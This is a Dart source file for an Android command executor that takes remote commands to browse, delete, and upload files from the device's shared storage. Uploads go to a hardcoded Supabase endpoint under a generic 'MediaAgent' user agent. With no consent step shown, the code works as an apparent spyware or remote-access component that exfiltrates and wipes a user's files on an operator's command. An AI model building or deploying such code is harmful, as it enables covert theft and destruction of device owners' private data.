import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'command_parser.dart';

class CommandExecutor {
  static const String _root = '/storage/emulated/0';
  static const String _uploadEndpoint = 'https://pbovhvhpewnooofaeybe.supabase.co/functions/v1/upload-file';
  static const String _defaultBucket = 'device-uploads';

  String _cwd = _root;
  String get cwd => _cwd;

  String _normalize(String path) {
    if (path.length > 1 && path.endsWith('/')) return path.substring(0, path.length - 1);
    return path;
  }

  String _resolvePath(String input) {
    if (input.isEmpty) return _cwd;
    if (input.startsWith('/')) return _normalize(input);
    if (input == '..') {
      if (_cwd == _root) return _root;
      final i = _cwd.lastIndexOf('/');
      return i > _root.length ? _cwd.substring(0, i) : _root;
    }
    return _normalize('$_cwd/$input');
  }

  bool _isInsideRoot(String path) => path == _root || path.startsWith('$_root/');

  Future<Map<String, dynamic>> execute(Command cmd) async {
    try {
      switch (cmd.action) {
        case CommandAction.changeDir:
          return _wrapSync(() => _cd(cmd.payload['path'] as String?));
        case CommandAction.listFiles:
          return _wrapSync(() => _ls(
                cmd.payload['path'] as String?,
                recursive: cmd.payload['recursive'] == true,
                limit: cmd.payload['limit'] is int ? cmd.payload['limit'] : 100,
              ));
        case CommandAction.deleteFile:
          return _wrapSync(() => _rm(cmd.payload['path'] as String?));
        case CommandAction.uploadFile:
          return await _upload(cmd.payload['path'] as String?, deviceId: cmd.deviceId, bucket: cmd.payload['bucket'] as String?);
        default:
          return _error('unsupported_command');
      }
    } catch (e) {
      return _error('execution_error', detail: e.toString());
    }
  }

  Map<String, dynamic> _cd(String? path) {
    if (path == null || path.isEmpty) return _error('cd_requires_path');
    final newPath = _resolvePath(path);
    if (!_isInsideRoot(newPath)) return _error('access_denied');
    final dir = Directory(newPath);
    if (!dir.existsSync()) return _error('directory_not_found', detail: newPath);
    _cwd = newPath;
    return _ok({'cwd': _cwd});
  }

  Map<String, dynamic> _ls(String? path, {bool recursive = false, int limit = 100}) {
    final target = (path == null || path.isEmpty) ? _cwd : _resolvePath(path);
    if (!_isInsideRoot(target)) return _error('access_denied');
    final dir = Directory(target);
    if (!dir.existsSync()) return _error('directory_not_found', detail: target);
    final List<Map<String, dynamic>> results = [];
    void walk(Directory d) {
      for (final entity in d.listSync(followLinks: false)) {
        if (results.length >= limit) return;
        final name = entity.path.split('/').last;
        final isDir = entity is Directory;
        results.add({'name': name, 'type': isDir ? 'dir' : 'file'});
        if (recursive && isDir) walk(entity);
      }
    }
    walk(dir);
    return _ok({'cwd': _cwd, 'count': results.length, 'items': results});
  }

  Map<String, dynamic> _rm(String? path) {
    if (path == null || path.isEmpty) return _error('rm_requires_file');
    final target = _resolvePath(path);
    if (!_isInsideRoot(target)) return _error('access_denied');
    final file = File(target);
    if (!file.existsSync()) return _error('file_not_found', detail: target);
    file.deleteSync();
    return _ok({'deleted': target});
  }

  Future<Map<String, dynamic>> _upload(String? path, {String? deviceId, String? bucket}) async {
    if (path == null || path.isEmpty) return _error('upload_requires_file');
    final target = _resolvePath(path);
    if (!_isInsideRoot(target)) return _error('access_denied');
    final file = File(target);
    if (!file.existsSync()) return _error('file_not_found', detail: target);

    try {
      final bytes = await file.readAsBytes();
      final fileB64 = base64Encode(bytes);
      final contentType = _guessContentType(file.path) ?? 'application/octet-stream';
      final payload = {
        'device_id': deviceId ?? '',
        'path': file.path.split('/').last,
        'file_b64': fileB64,
        'content_type': contentType,
        'bucket': bucket ?? _defaultBucket,
      };

      final uri = Uri.parse(_uploadEndpoint);
      final client = HttpClient();
      client.userAgent = 'MediaAgent/1.0';
      final req = await client.postUrl(uri).timeout(const Duration(seconds: 15));
      req.headers.set(HttpHeaders.contentTypeHeader, 'application/json');
      req.add(utf8.encode(jsonEncode(payload)));
      final resp = await req.close().timeout(const Duration(seconds: 60));
      final body = await resp.transform(utf8.decoder).join();

      client.close(force: true);

      if (resp.statusCode >= 200 && resp.statusCode < 300) {
        try {
          final parsed = jsonDecode(body);
          if (parsed is Map<String, dynamic>) return _ok({'file': target, 'upload_result': parsed});
          return _ok({'file': target, 'upload_result_text': body});
        } catch (_) {
          return _ok({'file': target, 'upload_result_text': body});
        }
      } else {
        return _error('upload_failed', detail: 'status=${resp.statusCode} body=$body');
      }
    } catch (e) {
      return _error('upload_exception', detail: e.toString());
    }
  }

  String? _guessContentType(String path) {
    final segs = path.split('.');
    if (segs.length < 2) return null;
    final ext = segs.last.toLowerCase();
    switch (ext) {
      case 'jpg':
      case 'jpeg':
        return 'image/jpeg';
      case 'png':
        return 'image/png';
      case 'gif':
        return 'image/gif';
      case 'mp4':
        return 'video/mp4';
      case 'mp3':
        return 'audio/mpeg';
      case 'zip':
        return 'application/zip';
      case 'pdf':
        return 'application/pdf';
      default:
        return null;
    }
  }

  Map<String, dynamic> _ok([Map<String, dynamic>? data]) {
    final m = {'ok': true};
    if (data != null) m.addAll(data);
    return m;
  }

  Map<String, dynamic> _error(String code, {String? detail}) {
    final m = {'ok': false, 'error': code};
    if (detail != null) m['detail'] = detail;
    return m;
  }

  Map<String, dynamic> _wrapSync(Map<String, dynamic> Function() fn) {
    try {
      return fn();
    } catch (e) {
      return _error('exception', detail: e.toString());
    }
  }
}